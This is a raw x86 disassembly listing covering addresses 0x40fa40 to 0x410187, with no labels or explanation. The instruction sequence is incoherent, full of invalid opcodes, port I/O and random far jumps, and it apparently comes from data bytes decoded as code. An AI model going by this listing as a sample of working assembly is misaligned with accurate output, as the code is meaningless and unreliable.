  40fa40:	xchg   edx,eax
  40fa41:	xlat   BYTE PTR ds:[ebx]
  40fa42:	daa    
  40fa43:	rcl    DWORD PTR [edi-0x4a],0x52
  40fa47:	cmp    DWORD PTR [esi+0x1b],ebx
  40fa4a:	aas    
  40fa4b:	loopne 0x40faab
  40fa4d:	xchg   ecx,eax
  40fa4e:	clc    
  40fa4f:	or     eax,0x9d2364a2
  40fa54:	push   edx
  40fa55:	push   ds
  40fa56:	rcl    BYTE PTR [eax+0x50],1
  40fa59:	and    al,0xb7
  40fa5b:	push   esp
  40fa5c:	int3   
  40fa5d:	test   eax,0x24adce33
  40fa62:	out    0xfd,eax
  40fa64:	cli    
  40fa65:	std    
  40fa66:	in     eax,0xb0
  40fa68:	sbb    DWORD PTR [edi-0x27d3c972],0x40
  40fa6f:	xchg   edx,eax
  40fa70:	cwde   
  40fa71:	mov    esp,0x13fa8b00
  40fa76:	mov    eax,0xaf081671
  40fa7b:	mov    cl,0xac
  40fa7d:	xor    eax,0x6bac6a59
  40fa82:	fdiv   QWORD PTR [edi]
  40fa84:	and    cl,BYTE PTR [esp+ecx*4]
  40fa87:	mov    ah,al
  40fa89:	push   eax
  40fa8a:	fistp  WORD PTR [ecx+0x281c0359]
  40fa90:	cmp    al,0xa3
  40fa92:	mov    BYTE PTR ds:0xc76207a3,bl
  40fa98:	cli    
  40fa99:	pushf  
  40fa9a:	cmp    DWORD PTR [eax+0x5d028305],0xc3b3b061
  40faa4:	push   cs
  40faa5:	fcmovnb st,st(1)
  40faa7:	mov    al,0xe1
  40faa9:	sbb    bl,BYTE PTR [ebx-0x6f]
  40faac:	pop    ss
  40faad:	cs jo  0x40fa88
  40fab0:	push   edi
  40fab1:	mov    al,ds:0x67c3b73d
  40fab6:	lock repnz and ebp,DWORD PTR cs:[esi]
  40fabb:	pop    esi
  40fabc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fabd:	inc    ebx
  40fabe:	scas   al,BYTE PTR es:[edi]
  40fabf:	aaa    
  40fac0:	fimul  DWORD PTR [esp+edi*4+0x38f740c6]
  40fac7:	and    BYTE PTR [ebx+0x1bc226fb],bl
  40facd:	push   ss
  40face:	jno    0x40fa8e
  40fad0:	pop    es
  40fad1:	ss mov edi,0xd704bb9e
  40fad7:	int    0x8a
  40fad9:	xchg   ebp,eax
  40fada:	jns    0x40faaf
  40fadc:	imul   edi,DWORD PTR [eax+0x59d93265],0x40
  40fae3:	xchg   ebp,eax
  40fae4:	icebp  
  40fae5:	loopne 0x40fb53
  40fae7:	mov    cl,BYTE PTR [esi+0x7c2936da]
  40faed:	xchg   esp,eax
  40faee:	jb     0x40fac6
  40faf0:	xchg   DWORD PTR [ecx+0x32ad00e6],esi
  40faf6:	xor    BYTE PTR [edx+0x675940f0],cl
  40fafc:	icebp  
  40fafd:	sti    
  40fafe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40faff:	mov    eax,0xde81b2e6
  40fb04:	mov    dh,0xab
  40fb06:	sub    eax,0xab57ce11
  40fb0b:	jmp    0x40fb60
  40fb0d:	stc    
  40fb0e:	pop    edi
  40fb0f:	call   0x6cfd72ca
  40fb14:	jbe    0x40fad0
  40fb16:	call   0xe01bc3d5
  40fb1b:	mov    cl,0xe2
  40fb1d:	jmp    0x1a99:0x75e46239
  40fb24:	and    al,0xbb
  40fb26:	enter  0x34f3,0x5d
  40fb2a:	mov    eax,0xa781a5aa
  40fb2f:	or     dh,0xb6
  40fb32:	cdq    
  40fb33:	or     dh,BYTE PTR [edi]
  40fb35:	xor    bh,BYTE PTR [ebp+0x53]
  40fb38:	iret   
  40fb39:	hlt    
  40fb3a:	adc    DWORD PTR [esi-0x47a969cd],0xffffffc6
  40fb41:	jg     0x40fb11
  40fb43:	leave  
  40fb44:	je     0x40fbbe
  40fb46:	call   0x226f1b6e
  40fb4b:	(bad)  
  40fb4c:	aam    0xd2
  40fb4e:	call   0xe6d:0x25bc41d1
  40fb55:	push   ebp
  40fb56:	sub    esi,DWORD PTR [ebp+esi*2-0x5f]
  40fb5a:	pushf  
  40fb5b:	cld    
  40fb5c:	neg    DWORD PTR [edi+0x2bf52a74]
  40fb62:	add    cl,BYTE PTR [esi+0x3b14281e]
  40fb68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb69:	pop    ebx
  40fb6a:	(bad)  
  40fb6b:	(bad)  
  40fb6d:	xchg   esp,eax
  40fb6e:	sub    al,dh
  40fb70:	jbe    0x40fb85
  40fb72:	fsub   QWORD PTR [edx+0x5]
  40fb75:	sub    DWORD PTR [edi],eax
  40fb77:	mov    ecx,0xa0687b22
  40fb7c:	popa   
  40fb7d:	adc    BYTE PTR [edi+ecx*2-0x57b851fc],ah
  40fb84:	out    0x8,eax
  40fb86:	jb     0x40fbae
  40fb88:	push   esi
  40fb89:	jg     0x40fb9d
  40fb8b:	in     al,dx
  40fb8c:	std    
  40fb8d:	sub    ah,ah
  40fb8f:	push   cs
  40fb90:	jae    0x40fb26
  40fb92:	shr    BYTE PTR [ecx],1
  40fb94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb95:	in     eax,dx
  40fb96:	dec    esi
  40fb97:	jae    0x40fbbe
  40fb99:	pop    eax
  40fb9a:	mov    ecx,0x7a098cf5
  40fb9f:	and    al,0xb2
  40fba1:	loop   0x40fc1d
  40fba3:	sbb    al,0x16
  40fba5:	inc    edi
  40fba6:	xor    bh,ah
  40fba8:	test   BYTE PTR [ecx+0x5e],0x76
  40fbac:	pop    ds
  40fbad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbae:	jne    0x40fb43
  40fbb0:	jo     0x40fbcf
  40fbb2:	xlat   BYTE PTR ds:[ebx]
  40fbb3:	ja     0x40fbb8
  40fbb5:	call   0xd978ced1
  40fbba:	test   eax,0x2f1b3aa8
  40fbbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbc0:	fs nop
  40fbc2:	sbb    al,0xdc
  40fbc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbc5:	mov    edx,0xb7244587
  40fbca:	call   0x34ca:0xb580c275
  40fbd1:	pop    ds
  40fbd2:	out    0xb1,al
  40fbd4:	pop    edi
  40fbd5:	add    cl,BYTE PTR [ecx]
  40fbd7:	sub    DWORD PTR [ecx+0x22b18c17],0xfffffff3
  40fbde:	adc    eax,0xba8c8351
  40fbe3:	outs   dx,DWORD PTR ds:[esi]
  40fbe4:	pop    esp
  40fbe5:	xchg   BYTE PTR [ebp+0x739bcc8e],cl
  40fbeb:	jb     0x40fc09
  40fbed:	sub    DWORD PTR [ebp+ecx*2-0x5083f82b],esi
  40fbf4:	mov    cl,0x6b
  40fbf6:	repnz mov ch,0xb2
  40fbf9:	inc    ecx
  40fbfa:	jbe    0x40fb9e
  40fbfc:	inc    ebp
  40fbfd:	adc    ebx,ebx
  40fbff:	retf   
  40fc00:	cmp    cl,BYTE PTR [edx-0x6c]
  40fc03:	mov    bl,0x81
  40fc05:	mov    edx,0x70221ad
  40fc0a:	jmp    0x40fc8b
  40fc0c:	test   eax,0xaae938e5
  40fc11:	outs   dx,DWORD PTR ds:[esi]
  40fc12:	repz cs xor eax,0x795ccb63
  40fc19:	mov    bh,0x60
  40fc1b:	popf   
  40fc1c:	or     DWORD PTR ds:0x29c9099c,edi
  40fc22:	test   eax,0xfae68e63
  40fc27:	(bad)  [edx]
  40fc29:	cmp    esp,ebp
  40fc2b:	icebp  
  40fc2c:	add    al,0xc3
  40fc2e:	sub    BYTE PTR [ebp+0x241b0903],0x37
  40fc35:	leave  
  40fc36:	loop   0x40fc9e
  40fc38:	out    dx,eax
  40fc39:	loop   0x40fbe6
  40fc3b:	cwde   
  40fc3c:	imul   edi,DWORD PTR [ecx+ecx*4],0x91b74bc8
  40fc43:	jecxz  0x40fca6
  40fc45:	mov    dl,0x4e
  40fc47:	mov    ebp,0x2a8b7a7c
  40fc4c:	in     eax,dx
  40fc4d:	cwde   
  40fc4e:	inc    ecx
  40fc4f:	rcr    BYTE PTR [edi-0x525bebca],0x19
  40fc56:	dec    esi
  40fc57:	popf   
  40fc58:	jle    0x40fbf7
  40fc5a:	mov    ecx,0xe7cddf60
  40fc5f:	jle    0x40fce0
  40fc61:	out    dx,eax
  40fc62:	xchg   BYTE PTR [esi-0x6a],bl
  40fc65:	mov    edx,0x9590c05d
  40fc6a:	dec    eax
  40fc6b:	xchg   ecx,eax
  40fc6c:	mov    edx,0x5a67646d
  40fc71:	fs aaa 
  40fc73:	cmp    edx,ecx
  40fc75:	loopne 0x40fc93
  40fc77:	mov    es,WORD PTR [ebx-0x49]
  40fc7a:	not    DWORD PTR [ebx-0x62]
  40fc7d:	cmp    eax,0x7172ed81
  40fc82:	cmp    esp,DWORD PTR [ecx-0x33]
  40fc85:	pop    edi
  40fc86:	(bad)  
  40fc87:	jbe    0x40fcbd
  40fc89:	repnz loopne 0x40fc11
  40fc8c:	gs sub ebx,edi
  40fc8f:	mov    ebx,0x45a6f2e1
  40fc94:	mov    ch,0xb2
  40fc96:	stc    
  40fc97:	(bad)  
  40fc99:	out    dx,al
  40fc9a:	mov    edx,0x8761de03
  40fc9f:	sbb    bh,bh
  40fca1:	stos   BYTE PTR es:[edi],al
  40fca2:	pop    ds
  40fca3:	(bad)  
  40fca4:	daa    
  40fca5:	push   cs
  40fca6:	add    BYTE PTR [ecx],0x81
  40fca9:	ss aad 0xfa
  40fcac:	lods   al,BYTE PTR ds:[esi]
  40fcad:	cmp    dh,BYTE PTR [edi]
  40fcaf:	call   0x7885:0x2da04e8a
  40fcb6:	pop    ebp
  40fcb7:	pop    edx
  40fcb8:	adc    ebx,esp
  40fcba:	push   ebx
  40fcbb:	repnz sbb dh,BYTE PTR [ecx]
  40fcbe:	or     ah,dh
  40fcc0:	xor    edi,ecx
  40fcc2:	imul   edi,DWORD PTR [eax],0xc65a801a
  40fcc8:	jb     0x40fce4
  40fcca:	pshufw mm5,QWORD PTR [ebp-0x44],0x22
  40fccf:	mov    edx,0x9d99550d
  40fcd4:	jle    0x40fd29
  40fcd6:	adc    eax,0xd858461b
  40fcdb:	popa   
  40fcdc:	and    DWORD PTR [edx+ebp*8+0x8],ecx
  40fce0:	ins    BYTE PTR es:[edi],dx
  40fce1:	inc    esp
  40fce2:	ins    BYTE PTR es:[edi],dx
  40fce3:	xrstor [edi+0x61026461]
  40fcea:	jae    0x40fd6b
  40fcec:	(bad)  
  40fced:	aam    0x98
  40fcef:	or     bh,BYTE PTR [edx]
  40fcf1:	push   eax
  40fcf2:	push   ebp
  40fcf3:	push   ebx
  40fcf4:	or     eax,0x13910a40
  40fcf9:	add    dh,BYTE PTR [ebx+ecx*8-0x2f]
  40fcfd:	mov    dl,0x80
  40fcff:	xor    eax,0xfbf8120a
  40fd04:	xchg   edx,eax
  40fd05:	outs   dx,BYTE PTR ss:[esi]
  40fd07:	test   BYTE PTR [ecx+0x6b],0x68
  40fd0b:	jb     0x40fcec
  40fd0d:	scas   al,BYTE PTR es:[edi]
  40fd0e:	jg     0x40fc98
  40fd10:	mov    DWORD PTR [ecx],edx
  40fd12:	jg     0x40fd25
  40fd14:	pushf  
  40fd15:	inc    eax
  40fd16:	es dec ecx
  40fd18:	in     eax,dx
  40fd19:	dec    ebp
  40fd1a:	test   DWORD PTR [edi+0x42bc30ba],ebp
  40fd20:	stos   BYTE PTR es:[edi],al
  40fd21:	in     al,0xf2
  40fd23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd24:	rcr    cl,0x41
  40fd27:	sti    
  40fd28:	pop    eax
  40fd29:	mov    ebx,0x3ed3132a
  40fd2e:	mov    bl,0x5e
  40fd30:	stos   BYTE PTR es:[edi],al
  40fd31:	and    al,BYTE PTR [eax+edx*1+0x171b8482]
  40fd38:	test   al,0xd5
  40fd3a:	fadd   DWORD PTR [edi+esi*1-0x34]
  40fd3e:	inc    ecx
  40fd3f:	add    al,0xe7
  40fd41:	cdq    
  40fd42:	(bad)  
  40fd44:	sub    al,0x3c
  40fd46:	sbb    DWORD PTR [ebx],ebx
  40fd48:	cs dec eax
  40fd4a:	xor    BYTE PTR [ebx-0x22],0x72
  40fd4e:	mov    dl,0xf1
  40fd50:	dec    ecx
  40fd51:	xor    ebx,DWORD PTR [ebp+0x16]
  40fd54:	dec    eax
  40fd55:	or     dh,BYTE PTR [eax+0x1f]
  40fd58:	adc    al,BYTE PTR [ebp+0x2f14dbed]
  40fd5e:	out    0x64,eax
  40fd60:	test   eax,0xda6e9647
  40fd65:	or     esi,DWORD PTR [eax]
  40fd67:	outs   dx,DWORD PTR ds:[esi]
  40fd68:	push   es
  40fd69:	push   ds
  40fd6a:	xor    al,0x65
  40fd6c:	leave  
  40fd6d:	sub    DWORD PTR [edx-0x78],edx
  40fd70:	test   BYTE PTR [edx],al
  40fd72:	js     0x40fdda
  40fd74:	shl    DWORD PTR [edx],0x43
  40fd77:	adc    eax,0x5379b97d
  40fd7c:	inc    ecx
  40fd7d:	xchg   ebx,eax
  40fd7e:	push   edi
  40fd7f:	sub    BYTE PTR [ecx+0x6e],0x1e
  40fd83:	sub    BYTE PTR [ebx+eiz*1],0x89
  40fd87:	fldcw  WORD PTR [ecx-0x5d]
  40fd8a:	(bad)  
  40fd8b:	sub    al,0x6b
  40fd8d:	push   0xb87fb477
  40fd92:	jo     0x40fd97
  40fd94:	or     esi,esi
  40fd96:	test   BYTE PTR es:[ebx+0x49],dh
  40fd9a:	dec    eax
  40fd9b:	and    DWORD PTR [edi],edx
  40fd9d:	adc    eax,0x712fd3a5
  40fda2:	sub    al,0x3d
  40fda4:	mov    ds:0x4d6c04c6,al
  40fda9:	mov    esp,0x8c28ce33
  40fdae:	fst    st(0)
  40fdb0:	mov    al,0x4f
  40fdb2:	in     eax,0xd1
  40fdb4:	iret   
  40fdb5:	or     DWORD PTR [edx],ebx
  40fdb7:	cmc    
  40fdb8:	ror    BYTE PTR [ecx-0x21a15daf],0x69
  40fdbf:	mul    esp
  40fdc1:	sub    bl,BYTE PTR [edx]
  40fdc3:	inc    ebx
  40fdc4:	push   esi
  40fdc5:	loopne 0x40fd5a
  40fdc7:	scas   eax,DWORD PTR es:[edi]
  40fdc8:	dec    eax
  40fdc9:	jg     0x40fe0a
  40fdcb:	test   BYTE PTR [esi-0x58586e22],dl
  40fdd1:	inc    ebx
  40fdd2:	ror    BYTE PTR [edx+0x54d3e7b1],cl
  40fdd8:	jbe    0x40fdc9
  40fdda:	jp     0x40fe39
  40fddc:	in     eax,dx
  40fddd:	add    DWORD PTR [eax+0x33],ecx
  40fde0:	adc    ebp,DWORD PTR [ebx+0x5236f687]
  40fde6:	in     al,0x9e
  40fde8:	inc    edx
  40fde9:	mov    bh,0x18
  40fdeb:	xrelease mov DWORD PTR [ecx-0x79],0xad83f5cd
  40fdf3:	jecxz  0x40fe44
  40fdf5:	bound  edx,QWORD PTR [eax-0x1d]
  40fdf8:	xlat   BYTE PTR ds:[ebx]
  40fdf9:	jl     0x40fdc2
  40fdfb:	dec    eax
  40fdfc:	int    0x2f
  40fdfe:	jno    0x40fe2c
  40fe00:	xor    al,0x35
  40fe02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe03:	adc    bl,BYTE PTR [ecx+0x292520da]
  40fe09:	rol    ecx,cl
  40fe0b:	jecxz  0x40fe79
  40fe0d:	adc    al,0xaf
  40fe0f:	or     al,0x6d
  40fe11:	jb     0x40fe61
  40fe13:	push   0x9b1e6ca5
  40fe18:	popf   
  40fe19:	xor    eax,0xab656d12
  40fe1e:	and    al,0x65
  40fe20:	aas    
  40fe21:	aas    
  40fe22:	cmp    esp,edi
  40fe24:	ins    BYTE PTR es:[edi],dx
  40fe25:	test   BYTE PTR [ecx+ebx*1],0xd8
  40fe29:	adc    al,0xfa
  40fe2b:	mov    al,ds:0x46b1be77
  40fe30:	cmp    BYTE PTR [esi-0x42],0x1f
  40fe34:	shl    BYTE PTR [esi],0x6a
  40fe37:	fistp  WORD PTR [ecx]
  40fe39:	xchg   BYTE PTR [ebx+0x3c8dbdfa],cl
  40fe3f:	dec    esp
  40fe40:	int    0x7f
  40fe42:	and    DWORD PTR [edx],edx
  40fe44:	in     al,dx
  40fe45:	mov    al,ds:0xef676e2c
  40fe4a:	stos   BYTE PTR es:[edi],al
  40fe4b:	pop    ebp
  40fe4c:	pop    ebx
  40fe4d:	or     al,0x1d
  40fe4f:	aaa    
  40fe50:	lods   al,BYTE PTR ds:[esi]
  40fe51:	(bad)  
  40fe52:	out    dx,al
  40fe53:	mov    ebp,0x561177f4
  40fe58:	sbb    ebx,DWORD PTR [eax]
  40fe5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe5b:	and    eax,0x68060ad
  40fe60:	xchg   ecx,eax
  40fe61:	dec    ebx
  40fe62:	(bad)  [edx]
  40fe64:	out    dx,eax
  40fe65:	hlt    
  40fe66:	or     DWORD PTR [ecx],ebp
  40fe68:	imul   esi,ecx,0x266c9dcb
  40fe6e:	test   eax,0xf521edfe
  40fe73:	mov    ah,0xd2
  40fe75:	add    ch,BYTE PTR [esi+0x48]
  40fe78:	(bad)  
  40fe79:	mov    ch,0xd0
  40fe7b:	push   esp
  40fe7c:	jb     0x40fe79
  40fe7e:	call   0x4878befc
  40fe83:	aam    0xab
  40fe85:	bound  ecx,QWORD PTR [ebp+edi*8-0x1dc0f21b]
  40fe8c:	sbb    eax,0x9ad09ed3
  40fe91:	or     DWORD PTR [esi],eax
  40fe93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe94:	mov    dl,0x5b
  40fe96:	jge    0x40fe2f
  40fe98:	mov    bl,ah
  40fe9a:	daa    
  40fe9b:	xchg   ecx,eax
  40fe9c:	xchg   esp,eax
  40fe9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe9e:	xchg   esi,eax
  40fe9f:	or     bl,BYTE PTR [edi+eax*1-0xa5a54de]
  40fea6:	adc    ebp,DWORD PTR [edi]
  40fea8:	test   DWORD PTR [ecx-0x4c47ab6],eax
  40feae:	add    edi,DWORD PTR [eax]
  40feb0:	jmp    FWORD PTR [ecx]
  40feb2:	ror    DWORD PTR [ecx+edx*8],0x61
  40feb6:	sbb    al,0xa2
  40feb8:	xchg   edi,eax
  40feb9:	jmp    0xf725:0xa1688e1f
  40fec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fec1:	mov    ds:0xb45a7211,eax
  40fec6:	sar    al,cl
  40fec8:	push   eax
  40fec9:	rcl    BYTE PTR [ebx+0x3c],cl
  40fecc:	fdivr  QWORD PTR [edx+0x49]
  40fecf:	outs   dx,BYTE PTR ds:[esi]
  40fed0:	adc    dh,BYTE PTR [edx+0x4c605828]
  40fed6:	shl    BYTE PTR [esi],0x42
  40fed9:	mov    edx,0x4bf77176
  40fede:	push   es
  40fedf:	dec    ecx
  40fee0:	xlat   BYTE PTR ds:[ebx]
  40fee1:	xchg   ebp,eax
  40fee2:	(bad)  
  40fee3:	ss inc esp
  40fee5:	mov    ecx,0xe8619b44
  40feea:	push   ebx
  40feeb:	and    eax,0x6e397b8f
  40fef0:	lahf   
  40fef1:	adc    DWORD PTR [ecx],0xd592c419
  40fef7:	inc    eax
  40fef8:	mov    ebp,0x586ea35a
  40fefd:	cmp    edi,eax
  40feff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff00:	int3   
  40ff01:	ret    0xf9de
  40ff04:	aad    0xe2
  40ff06:	in     eax,dx
  40ff07:	scas   eax,DWORD PTR es:[edi]
  40ff08:	cmp    DWORD PTR [edx-0x44],ebp
  40ff0b:	and    ecx,ebx
  40ff0d:	adc    edx,DWORD PTR [edx-0xd262e85]
  40ff13:	es lahf 
  40ff15:	push   edi
  40ff16:	mov    ds:0x845490b7,eax
  40ff1b:	fwait
  40ff1c:	jge    0x40ff27
  40ff1e:	loop   0x40ff41
  40ff20:	das    
  40ff21:	push   eax
  40ff22:	sahf   
  40ff23:	jl     0x40ff31
  40ff25:	loope  0x40ff4c
  40ff27:	adc    ecx,esp
  40ff29:	or     BYTE PTR [edi-0x470c9b1a],al
  40ff2f:	add    eax,0x84f5014a
  40ff34:	jl     0x40fed5
  40ff36:	mov    dl,0x2f
  40ff38:	xor    BYTE PTR [edx],dh
  40ff3a:	mov    WORD PTR [esi],?
  40ff3c:	mov    ebx,0xedcd6f08
  40ff41:	stos   BYTE PTR es:[edi],al
  40ff42:	jae    0x40ff62
  40ff44:	xchg   BYTE PTR [ecx],dl
  40ff46:	shr    BYTE PTR [ebp-0x5deb2724],1
  40ff4c:	out    0xf4,al
  40ff4e:	add    bl,dl
  40ff50:	pop    ds
  40ff51:	pop    edi
  40ff52:	sti    
  40ff53:	jo     0x40ff03
  40ff55:	or     dh,bh
  40ff57:	std    
  40ff58:	dec    eax
  40ff59:	inc    BYTE PTR [edx-0x2a]
  40ff5c:	ds mov dl,0xdc
  40ff5f:	inc    esi
  40ff60:	pusha  
  40ff61:	jnp    0x40ffab
  40ff63:	dec    esp
  40ff64:	and    DWORD PTR [ecx+0x3],edi
  40ff67:	add    al,0x41
  40ff69:	ret    
  40ff6a:	sti    
  40ff6b:	jne    0x40ff2c
  40ff6d:	adc    ecx,DWORD PTR [esp+eiz*2+0x71]
  40ff71:	out    dx,al
  40ff72:	adc    al,0xca
  40ff74:	mov    bh,ah
  40ff76:	mov    bl,0xdb
  40ff78:	stos   BYTE PTR es:[edi],al
  40ff79:	or     eax,0xe26ca84
  40ff7e:	xor    DWORD PTR [ecx-0x27],eax
  40ff81:	(bad)  
  40ff82:	xlat   BYTE PTR ds:[ebx]
  40ff83:	inc    esi
  40ff84:	fst    QWORD PTR [ecx-0x75]
  40ff87:	mov    edi,0x9211fcf4
  40ff8c:	sub    edi,DWORD PTR [ebx]
  40ff8e:	mov    BYTE PTR [edi+0x78],dl
  40ff91:	test   DWORD PTR [edi],esp
  40ff93:	or     DWORD PTR [edx],esi
  40ff95:	ins    BYTE PTR es:[edi],dx
  40ff96:	in     eax,0x50
  40ff98:	lea    ebx,[edi+0x7fb53b76]
  40ff9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff9f:	xchg   ebp,eax
  40ffa0:	mov    bl,BYTE PTR [edi+0x573a446]
  40ffa6:	xor    dh,BYTE PTR [edx+0x153b11bb]
  40ffac:	pop    ecx
  40ffad:	dec    ebx
  40ffae:	out    dx,al
  40ffaf:	ja     0x40ff54
  40ffb1:	mov    eax,0x93051c37
  40ffb6:	inc    ebx
  40ffb7:	sub    ecx,DWORD PTR [ecx]
  40ffb9:	mov    edx,0xde03f77b
  40ffbe:	aad    0xe3
  40ffc0:	enter  0xbb1c,0x6f
  40ffc4:	outs   dx,BYTE PTR ds:[esi]
  40ffc5:	pop    edx
  40ffc6:	retf   0x3f2b
  40ffc9:	inc    esp
  40ffca:	push   ebx
  40ffcb:	xchg   esp,eax
  40ffcc:	pop    edx
  40ffcd:	pop    edi
  40ffce:	fidivr WORD PTR [edi+esi*4+0x23b4a28c]
  40ffd5:	inc    edi
  40ffd6:	aad    0x6d
  40ffd8:	push   esi
  40ffd9:	cmp    al,0x32
  40ffdb:	pop    ds
  40ffdc:	or     al,cl
  40ffde:	fidivr DWORD PTR cs:[edx+0x72]
  40ffe2:	adc    al,0xa5
  40ffe4:	jns    0x40ffda
  40ffe6:	fiadd  DWORD PTR [eax-0x5c23cc57]
  40ffec:	out    dx,al
  40ffed:	push   ss
  40ffee:	mov    bh,0xc7
  40fff0:	adc    al,BYTE PTR [ebp+ebx*4-0x5e4802a2]
  40fff7:	(bad)  
  40fffa:	outs   dx,BYTE PTR ds:[esi]
  40fffb:	inc    esp
  40fffc:	retf   
  40fffd:	and    DWORD PTR [esi],esi
  40ffff:	aad    0xea
  410001:	inc    esp
  410002:	data16 mov bl,0xa
  410005:	push   ecx
  410006:	mov    ds:0x82ac45fe,al
  41000b:	mov    eax,ds:0x969d45ef
  410010:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410011:	outs   dx,DWORD PTR ds:[esi]
  410012:	cmp    edx,edx
  410014:	out    0x52,al
  410016:	fcom   DWORD PTR [edi-0x2a8125b5]
  41001c:	repnz cmp eax,0x82c0dcb4
  410022:	mov    ch,0x67
  410025:	ins    BYTE PTR es:[edi],dx
  410026:	mov    ecx,0xa22831b9
  41002b:	jl     0x410014
  41002d:	shl    DWORD PTR [bp+si-0x3db5],1
  410032:	inc    edi
  410033:	pop    esi
  410034:	adc    al,0x77
  410036:	fstp   QWORD PTR [ebx+edx*4-0x2528bab6]
  41003d:	or     bh,BYTE PTR [eax]
  41003f:	pop    esi
  410040:	adc    dl,BYTE PTR [esi]
  410042:	mov    cl,0x5c
  410044:	add    DWORD PTR [ebp-0x555a95ff],0xe388de1d
  41004e:	nop
  41004f:	in     eax,dx
  410050:	in     al,dx
  410051:	mov    bh,0xe9
  410053:	cmp    ecx,DWORD PTR [edx-0x35]
  410056:	ins    BYTE PTR es:[edi],dx
  410057:	xchg   edx,eax
  410058:	fidivr DWORD PTR [ecx+0x48189a68]
  41005e:	lock pop ds
  410060:	test   al,0x1a
  410062:	inc    esp
  410063:	call   0xe7ec4a5e
  410068:	jns    0x41009a
  41006a:	adc    ebp,esi
  41006c:	mov    ebp,0xaf260f53
  410071:	add    cl,BYTE PTR [esi]
  410073:	inc    ebx
  410074:	outs   dx,BYTE PTR ds:[esi]
  410075:	dec    edi
  410076:	push   ebp
  410077:	dec    esi
  410078:	ins    BYTE PTR es:[edi],dx
  410079:	sahf   
  41007a:	push   edi
  41007b:	fwait
  41007c:	jmp    0x5810fee4
  410081:	out    0x49,eax
  410083:	pushf  
  410084:	sti    
  410085:	sbb    eax,DWORD PTR [edx]
  410087:	ins    BYTE PTR es:[edi],dx
  410088:	mov    cl,0x96
  41008a:	lock out 0xfa,eax
  41008d:	into   
  41008e:	(bad)  
  41008f:	outs   dx,DWORD PTR ds:[esi]
  410090:	and    eax,0xd74b35ba
  410095:	cdq    
  410096:	bound  esi,QWORD PTR [ebp+0x43e4b71a]
  41009c:	outs   dx,DWORD PTR ds:[esi]
  41009d:	push   ds
  41009e:	mov    al,ds:0xada3cc42
  4100a3:	pop    ds
  4100a4:	push   esp
  4100a5:	inc    ecx
  4100a6:	push   0x947f9a8c
  4100ab:	test   al,0xac
  4100ad:	into   
  4100ae:	xchg   edi,eax
  4100af:	scas   al,BYTE PTR es:[edi]
  4100b0:	hlt    
  4100b1:	call   0x4523:0xc1644f51
  4100b8:	xlat   BYTE PTR ds:[ebx]
  4100b9:	stos   BYTE PTR es:[edi],al
  4100ba:	xor    esi,DWORD PTR ds:0xc71cb725
  4100c0:	adc    eax,0x1b3b4d70
  4100c5:	sub    dl,bh
  4100c7:	in     eax,dx
  4100c8:	xchg   BYTE PTR [ebp-0x71],ch
  4100cb:	lahf   
  4100cc:	lock cmp DWORD PTR [esi+ebp*4+0x42],ebx
  4100d1:	test   al,0xd4
  4100d3:	and    DWORD PTR [esi-0x77f591c3],0x71aec962
  4100dd:	or     al,0xb1
  4100df:	or     al,BYTE PTR [esi+eiz*1-0x1e]
  4100e3:	and    dh,bh
  4100e5:	ds pop ss
  4100e7:	nop
  4100e8:	pop    eax
  4100e9:	mov    ?,esp
  4100eb:	mov    cl,0xb4
  4100ed:	leave  
  4100ee:	mov    ds:0x33830e11,eax
  4100f3:	xor    dl,bl
  4100f5:	pop    esp
  4100f6:	test   BYTE PTR ds:[esi+esi*4],cl
  4100fa:	push   ebx
  4100fb:	and    esp,edx
  4100fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100fe:	sub    BYTE PTR [ecx-0x11f09183],bl
  410104:	dec    esp
  410105:	imul   ebp,DWORD PTR [edi],0x2301662e
  41010b:	xchg   esp,eax
  41010c:	clc    
  41010d:	add    edx,ecx
  41010f:	and    eax,0x48825cac
  410114:	loope  0x4100dd
  410116:	scas   eax,DWORD PTR es:[edi]
  410117:	pop    ebx
  410118:	xchg   esi,eax
  410119:	stc    
  41011a:	adc    cl,BYTE PTR [eax+ecx*1+0x3e3a52f0]
  410121:	mov    ecx,0xc03a0c48
  410126:	stos   DWORD PTR es:[edi],eax
  410127:	xlat   BYTE PTR ds:[ebx]
  410128:	jge    0x410139
  41012a:	cs sub eax,0x1cb25ed6
  410130:	inc    edx
  410131:	mov    bl,0xda
  410133:	pusha  
  410134:	inc    esi
  410135:	je     0x4101a6
  410137:	jb     0x4100bb
  410139:	das    
  41013a:	jle    0x41016f
  41013c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41013d:	(bad)  
  41013e:	test   eax,0x15a0180b
  410143:	jnp    0x4101b3
  410145:	shl    ebx,0x1b
  410148:	inc    ecx
  410149:	sbb    dh,BYTE PTR [esi-0x6]
  41014c:	sbb    al,0x61
  41014e:	and    al,bl
  410150:	sub    esp,DWORD PTR [ecx]
  410152:	out    dx,al
  410153:	or     eax,0x8d89e8a9
  410158:	int    0x3d
  41015a:	mov    ebp,esi
  41015c:	loopne 0x4101c4
  41015e:	lods   al,BYTE PTR ds:[esi]
  41015f:	or     BYTE PTR [ebx+ebx*1+0x74617ddf],cl
  410166:	test   DWORD PTR [esi],esi
  410168:	mov    dh,0x86
  41016a:	fnsave [edi+0x74839324]
  410170:	jns    0x41019c
  410172:	push   es
  410173:	mov    esp,esp
  410175:	in     eax,0x4e
  410177:	jle    0x4101b6
  410179:	mov    DWORD PTR [edx+0x61112488],0xe3be91e
  410183:	sub    DWORD PTR [esi+eiz*1-0x4e],edi
  410187:	sbb    eax,0x2bd0c96d
